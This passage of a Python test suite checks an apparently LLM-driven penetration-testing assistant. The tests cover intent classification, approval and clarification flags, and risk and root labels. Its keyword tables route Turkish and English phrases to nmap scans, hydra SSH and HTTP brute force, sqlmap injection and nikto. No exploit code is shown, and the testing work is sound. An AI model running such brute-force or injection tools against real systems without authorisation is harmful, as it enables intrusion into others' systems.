        orch = self._make_orchestrator_with_mock_intent(
            coordinator, IntentType.UNKNOWN, "test"
        )
        result = orch.process_v2("merhaba")
        assert result["needs_clarification"] is True
        assert result["command"] is None

    def test_orchestrator_low_confidence_asks_clarification(self, coordinator):
        orch = self._make_orchestrator_with_mock_intent(
            coordinator, IntentType.PORT_SCAN, "192.168.1.10",
            confidence=0.3
        )
        result = orch.process_v2("bir şey yap", target="192.168.1.10")
        assert result["needs_clarification"] is True

    def test_orchestrator_missing_target_asks_clarification(self, coordinator):
        orch = self._make_orchestrator_with_mock_intent(
            coordinator, IntentType.PORT_SCAN, None
        )
        result = orch.process_v2("port tara")
        assert result["needs_clarification"] is True

    def test_orchestrator_requires_approval_flag(self, coordinator):
        """Başarılı komutlarda requires_approval=True olmalı."""
        orch = self._make_orchestrator_with_mock_intent(
            coordinator, IntentType.HOST_DISCOVERY, "192.168.1.0/24"
        )
        result = orch.process_v2("ağı tara", target="192.168.1.0/24")
        assert result["success"] is True
        assert result["requires_approval"] is True


# =============================================================================
# G) KEYWORD FILTER DOĞRULUK TESTLERİ
# =============================================================================

class TestKeywordFilterAccuracy:
    """Keyword pre-filter doğruluğu."""

    @pytest.mark.parametrize(
        "user_input, expected_intent",
        [
            ("192.168.1.0/24 ağını tara", IntentType.HOST_DISCOVERY),
            ("ping sweep yap", IntentType.HOST_DISCOVERY),
            ("ağdaki aktif cihazları bul", IntentType.HOST_DISCOVERY),
            ("port taraması yap", IntentType.PORT_SCAN),
            ("açık portları kontrol et", IntentType.PORT_SCAN),
            ("tcp scan", IntentType.PORT_SCAN),
            ("servis tespit et", IntentType.SERVICE_DETECTION),
            ("version detect", IntentType.SERVICE_DETECTION),
            ("işletim sistemi tespit", IntentType.OS_DETECTION),
            ("os detection", IntentType.OS_DETECTION),
            ("zafiyet taraması yap", IntentType.VULN_SCAN),
            ("vulnerability scan", IntentType.VULN_SCAN),
            ("ssl sertifika analiz", IntentType.SSL_SCAN),
            ("tls analizi", IntentType.SSL_SCAN),
            ("dizin taraması yap", IntentType.WEB_DIR_ENUM),
            ("gobuster kullan", IntentType.WEB_DIR_ENUM),
            ("dns sorgusu yap", IntentType.DNS_LOOKUP),
            ("nslookup", IntentType.DNS_LOOKUP),
            ("subdomain keşfet", IntentType.SUBDOMAIN_ENUM),
            ("whois bilgisi", IntentType.WHOIS_LOOKUP),
            ("ssh brute force", IntentType.BRUTE_FORCE_SSH),
            ("hydra ssh", IntentType.BRUTE_FORCE_SSH),
            ("http brute force", IntentType.BRUTE_FORCE_HTTP),
            ("login brute force", IntentType.BRUTE_FORCE_HTTP),
            ("sql injection testi", IntentType.SQL_INJECTION),
            ("sqlmap kullan", IntentType.SQL_INJECTION),
            ("nikto ile tara", IntentType.WEB_VULN_SCAN),
            ("web zafiyet taraması", IntentType.WEB_VULN_SCAN),
            ("nmap nedir?", IntentType.INFO_QUERY),
            ("port tarama nasıl çalışır", IntentType.INFO_QUERY),
            ("merhaba", IntentType.UNKNOWN),
            ("selam", IntentType.UNKNOWN),
        ],
    )
    def test_keyword_suggests_correct_intent(self, user_input, expected_intent):
        kf = KeywordPreFilter()
        suggestion = kf.suggest(user_input)
        expected_label = expected_intent.value if expected_intent is not None else "None"
        suggestion_label = suggestion.value if suggestion is not None else "None"
        assert suggestion == expected_intent, \
            f"Input: '{user_input}' -> Expected: {expected_label}, Got: {suggestion_label}"

    def test_cross_validation_compatible_groups(self):
        """Yakın akraba intent'ler uyumlu sayılmalı."""
        kf = KeywordPreFilter()
        # PORT_SCAN ve HOST_DISCOVERY aynı grupta
        ok, msg = kf.cross_validate(IntentType.PORT_SCAN, "ağdaki cihazları bul")
        assert ok is True

    def test_cross_validation_mismatch(self):
        """Farklı kategorilerde uyumsuzluk tespit edilmeli."""
        kf = KeywordPreFilter()
        ok, msg = kf.cross_validate(IntentType.SQL_INJECTION, "ping sweep yap")
        assert ok is False
        assert msg is not None

    def test_cross_validation_no_keyword_match(self):
        """Keyword eşleşmesi yoksa LLM'e güvenilmeli."""
        kf = KeywordPreFilter()
        ok, msg = kf.cross_validate(IntentType.PORT_SCAN, "asdfghjkl random text")
        assert ok is True


# =============================================================================
# H) RISK LEVEL VE ROOT YETKİ DOĞRULUK TESTLERİ
# =============================================================================

class TestRiskAndRootAccuracy:
    """Risk seviyeleri ve root yetki gereksinimlerinin doğruluğu."""

    def test_low_risk_tools(self):
        """Düşük riskli tool'lar doğru etiketlenmeli."""
        low_risk_intents = [
            IntentType.HOST_DISCOVERY,
            IntentType.DNS_LOOKUP,
            IntentType.WHOIS_LOOKUP,
        ]
        for intent in low_risk_intents:
            tool_def = TOOL_REGISTRY[intent]
            assert tool_def.risk_level == RiskLevel.LOW, \
                f"{intent.value} should be LOW risk, got {tool_def.risk_level.value}"

    def test_medium_risk_tools(self):
        """Orta riskli tool'lar doğru etiketlenmeli."""
        medium_risk_intents = [
            IntentType.PORT_SCAN,
            IntentType.SERVICE_DETECTION,
            IntentType.OS_DETECTION,
            IntentType.SSL_SCAN,
            IntentType.WEB_DIR_ENUM,
            IntentType.WEB_VULN_SCAN,
            IntentType.SUBDOMAIN_ENUM,
        ]
        for intent in medium_risk_intents:
            tool_def = TOOL_REGISTRY[intent]
            assert tool_def.risk_level == RiskLevel.MEDIUM, \
                f"{intent.value} should be MEDIUM risk, got {tool_def.risk_level.value}"

    def test_high_risk_tools(self):
        """Yüksek riskli tool'lar doğru etiketlenmeli."""
        high_risk_intents = [
            IntentType.VULN_SCAN,
            IntentType.BRUTE_FORCE_SSH,
            IntentType.BRUTE_FORCE_HTTP,
            IntentType.SQL_INJECTION,
        ]
        for intent in high_risk_intents:
            tool_def = TOOL_REGISTRY[intent]
            assert tool_def.risk_level == RiskLevel.HIGH, \
                f"{intent.value} should be HIGH risk, got {tool_def.risk_level.value}"

    def test_root_required_tools(self):
        """Root gerektirenler: os_detection, vuln_scan."""
        root_intents = [
            IntentType.OS_DETECTION,
            IntentType.VULN_SCAN,
        ]
        for intent in root_intents:
            tool_def = TOOL_REGISTRY[intent]
            assert tool_def.requires_root is True, \
                f"{intent.value} should require root"

    def test_non_root_tools(self):
        """Root gerektirmeyen tool'lar."""
        non_root_intents = [
            IntentType.HOST_DISCOVERY,
            IntentType.PORT_SCAN,
            IntentType.SERVICE_DETECTION,
            IntentType.SSL_SCAN,
            IntentType.WEB_DIR_ENUM,
            IntentType.WEB_VULN_SCAN,
            IntentType.DNS_LOOKUP,
            IntentType.SUBDOMAIN_ENUM,
            IntentType.WHOIS_LOOKUP,
            IntentType.BRUTE_FORCE_SSH,
            IntentType.BRUTE_FORCE_HTTP,
            IntentType.SQL_INJECTION,
        ]
        for intent in non_root_intents:
            tool_def = TOOL_REGISTRY[intent]
            assert tool_def.requires_root is False, \
                f"{intent.value} should NOT require root"


# =============================================================================
# I) build_tool_spec METADATA-ONLY DOĞRULAMA
# =============================================================================

class TestBuildToolSpecMetadataOnly:
    """Sprint 3.5 Track E: build_tool_spec artık argüman üretmemeli,
    sadece metadata taşımalı. Gerçek komut execution tool'dan gelir."""

    def test_build_tool_spec_returns_empty_arguments(self):
        """build_tool_spec arguments=[] dönmeli (metadata-only)."""
        spec = build_tool_spec(
            IntentType.PORT_SCAN,
            target="192.168.1.10",
            params={"ports": "22,80"}
        )
        assert spec is not None
        assert spec.arguments == [], \
            f"build_tool_spec artık argument üretmemeli, got: {spec.arguments}"

    def test_build_tool_spec_preserves_metadata(self):
        """build_tool_spec risk_level ve requires_root doğru taşımalı."""
        spec = build_tool_spec(
            IntentType.PORT_SCAN,
            target="192.168.1.10",
        )
        assert spec.requires_root is False  # PORT_SCAN -sT varsayilan, root gerektirmez
        assert spec.risk_level == RiskLevel.MEDIUM
        assert spec.tool == "nmap"
        assert spec.target == "192.168.1.10"

    @pytest.mark.parametrize("intent_type", [
        IntentType.HOST_DISCOVERY,
        IntentType.PORT_SCAN,
        IntentType.SERVICE_DETECTION,
        IntentType.OS_DETECTION,
        IntentType.VULN_SCAN,
        IntentType.SSL_SCAN,
        IntentType.WEB_DIR_ENUM,
        IntentType.WEB_VULN_SCAN,
        IntentType.DNS_LOOKUP,
        IntentType.SUBDOMAIN_ENUM,
        IntentType.WHOIS_LOOKUP,
        IntentType.BRUTE_FORCE_SSH,
        IntentType.BRUTE_FORCE_HTTP,
        IntentType.SQL_INJECTION,
    ])
    def test_all_executable_intents_produce_empty_args(self, intent_type):
        """Her executable intent metadata-only ToolSpec üretmeli."""
        target = "http://example.com/v.php?id=1" if "sql" in intent_type.value or "web" in intent_type.value else "192.168.1.10"
        if "dns" in intent_type.value or "subdomain" in intent_type.value or "whois" in intent_type.value or "ssl" in intent_type.value:
            target = "example.com"
        spec = build_tool_spec(intent_type, target=target)
        assert spec is not None
        assert spec.arguments == []
